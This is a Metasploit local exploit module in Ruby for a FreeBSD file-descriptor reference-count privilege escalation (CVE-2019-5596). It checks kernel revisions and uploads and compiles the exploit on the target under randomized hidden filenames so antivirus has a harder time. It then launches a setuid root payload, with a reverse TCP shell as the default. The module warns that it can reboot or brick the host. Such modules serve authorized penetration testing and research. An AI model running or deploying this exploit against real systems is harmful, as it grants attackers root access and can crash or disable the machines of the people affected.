##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = AverageRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Compile
  #include Msf::Post::Linux::System
  #include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'FreeBSD File Descriptor Ref Count Priv Esc',
        'Description'    => %q(
            This exploit module illustrates how a vulnerability could be exploited
          in an linux command for priv esc.

            WARNING: Canceling execution of this exploit will case a system reboot.
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'h00die', # msf module
            'Peter Holm', # original analysis
            'Karsten KÃ¶nig' # poc and edb module
          ],
        'Platform'       => [ 'bsd' ],
        'Arch'           => [ ARCH_X64, ARCH_CMD ],
        'SessionTypes'   => [ 'shell', 'meterpreter' ],
        'Targets'        => [[ 'Auto', {} ]],
        'Privileged'     => true,
        'References'     =>
          [
            [ 'EDB', '47829' ],
            [ 'URL', 'https://www.freebsd.org/security/advisories/FreeBSD-SA-19:02.fd.asc'],
            [ 'CVE', '2019-5596']
          ],
        'Notes'         => {
          'Stability'   => [CRASH_OS_RESTARTS],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS, SCREEN_EFFECTS]
        },
        'DefaultOptions' => {
          'WfsDelay' => 3600, # 60min
          'PAYLOAD' => 'bsd/x64/shell_reverse_tcp'
        },
        'DisclosureDate' => "Feb 05 2019",
        'DefaultTarget'  => 0
      )
    )
    register_options [
      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w[Auto True False] ])
    ]
    # force exploit is used to bypass the check command results
    register_advanced_options [
      OptBool.new('ForceExploit',  [ false, 'Override check result', false ]),
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ]

  end

  # Simplify pulling the writable directory variable
  def base_dir
    datastore['WritableDir'].to_s
  end

  # Simplify and standardize uploading a file
  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    write_file path, data
  end

  # Simplify uploading and chmoding a file
  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
    register_file_for_cleanup path
  end

  # Simplify uploading and compiling a file
  def upload_and_compile(path, data, cc_cmd='')
    upload "#{path}.c", data

    if session.type.eql? 'shell'
      cc_cmd = "PATH=$PATH:/usr/bin/ #{cc_cmd}"
    end

    output = cmd_exec cc_cmd

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end

    register_file_for_cleanup path
    chmod path
  end

  def has_cc?
    command_exists? 'cc'
  rescue
    raise 'Unable to check for cc'
  end

  # Pull the exploit binary or file (.c typically) from our system
  def exploit_data(file)
    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-5596', file)
  end

  # If we're going to live compile on the system, check cc is installed
  def live_compile?
    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')

    if has_cc?
      vprint_good 'cc is installed'
      return true
    end

    unless datastore['COMPILE'].eql? 'Auto'
      fail_with Failure::BadConfig, 'cc is not installed. Compiling will fail.'
    end
  end

  def check
    # Check the kernel version to see if its in a vulnerable range
    release = cmd_exec('/sbin/sysctl kern.version').split(' ')
    major = release[2]
    rev = Gem::Version.new(release[3].delete('r'))

    if major.include? '12'
      if major.include? 'STABLE' and rev > Gem::Version.new('343781')
        vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
        return CheckCode::Safe
      end
      if major.include? 'RELEASE' and rev >= Gem::Version.new('343790')
        vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
        return CheckCode::Safe
      end
    elsif major.include? '11' and (rev <= Gem::Version.new('338618') or rev >= Gem::Version.new('343786'))
      vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
      return CheckCode::Safe
    else
      vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
      return CheckCode::Safe
    end

    if not file?('/etc/libmap.conf')
      vprint_error('File /etc/libmap.conf not found, and is required for exploitation.')
      return CheckCode::Safe
    end

    maxfiles = cmd_exec('sysctl kern.maxfiles').split(' ')[1]
    if maxfiles.to_i < 64303
      vprint_error('In testing, when kern.maxfiles is < 60000 the exploit will most likely fail and reboot the system.')
      return CheckCode::Detected #detected, it is vuln, but not exploitable from our testing, but maybe for others?
    end

    vprint_good "FreeBSD release #{major} rev r#{rev} with maxfiles #{maxfiles} is vulnerable"
    CheckCode::Vulnerable
  end

  def exploit
    unless check == CheckCode::Vulnerable
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    # Check if we're already root
    if is_root?
      unless datastore['ForceExploit']
        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
      end
    end

    # Make sure we can write our exploit and payload to the remote system
    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    p = store_loot('libmap.conf', 'text/plain', datastore['RHOST'], read_file('/etc/libmap.conf'), 'Backup of libmap.conf')
    print_status 'Stored /etc/libmap.conf in loot.  If session cleanup is unsuccessful, system will brick. Use this to unbrick'

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Upload exploit executable, writing to a random name so AV doesn't have too easy a job
    executable_name = ".#{rand_text_alphanumeric(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    stub_name = ".#{rand_text_alphanumeric(5..10)}"
    stub_path = "#{base_dir}/#{stub_name}"
    if live_compile?
      vprint_status 'Live compiling exploit on system...'
      upload_and_compile executable_path, strip_comments(exploit_data('heavy_cyber_weapon.c')), "cc -o #{executable_path} -lpthread #{executable_path}.c"
      rm_f "#{executable_path}.c"
      stub = exploit_data('program.c').gsub('/tmp/xxxx', payload_path)
      upload_and_compile stub_path, strip_comments(stub), "cc -o #{stub_path}.o -c #{stub_path}.c -fPIC"
      cmd_exec "cc -shared -Wl,-soname,libno_ex.so.1 -o #{base_dir}/libno_ex.so.1.0 #{stub_path}.o -nostartfiles"
      rm_f "#{stub_path}.c"
      rm_f "#{stub_path}.o"

      runner_name = ".#{rand_text_alphanumeric(5..10)}.sh"
      runner_path = "#{base_dir}/#{runner_name}"
      runner = %Q{#!/bin/bash
#{executable_path}
su
#{payload_path}
}
      upload_and_chmodx runner_path, runner
    else
      vprint_status 'Dropping pre-compiled exploit on system...'
      vprint_error 'not created yet'
      return 0
      #upload_and_chmodx executable_path, exploit_data('example')
    end

    # Launch exploit with a timeout.  We also have a vprint_status so if the user wants all the
    # output from the exploit being run, they can optionally see it
    timeout = 3600 #60min
    print_status "Launching exploit... May take up to 60 minutes. Start time: #{Time.now}"
    output = cmd_exec "#{runner_path}", nil, timeout
    output.each_line { |line| vprint_status line.chomp }
    if setuid?(payload_path)
      print_good 'Payload suid set, launching root payload'
      cmd_exec 'su'
      cmd_exec payload_path
    else
      print_error("no suid on #{payload_path}")
    end
    print_status 'Performing Cleanup'
    #rm_f stub_path
    #rm_f payload_path
    #rm_f executable_path
    #rm_f runner_path

    rm_f '/tmp/dummy'
    rm_f '/tmp/dummy2'
    rm_f '/tmp/pwn'
    rm_f '/tmp/pwn2'
    rm_f '/tmp/sync_forks'
    rm_f '/tmp/sync_forks1'
    rm_f '/tmp/sync_forks2'
    rm_f '/tmp/sync_forks3'

    def on_new_session
      print_good 'Replacing /etc/libmap.conf with /tmp/libmap.conf to prevent bricking system'
      cmd_exec 'cp /tmp/libmap.conf /etc/libmap.conf'
    end
  end
end
